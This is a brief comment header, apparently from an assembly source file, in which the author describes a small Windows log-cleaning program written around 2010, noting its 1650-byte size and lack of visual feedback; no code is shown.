; This was coded circa 2010 - probably before that. At the time I couldn't
; find an open-source log cleaner for Windows. I decided to write this
; simple little piece of code.

; As it's written in asm it's fairly compact (1650 bytes EXE). Or as
; compact as my messy coding can get it anyway. There is no visual feedback
; from it. I may change that if I ever decide to rework this.
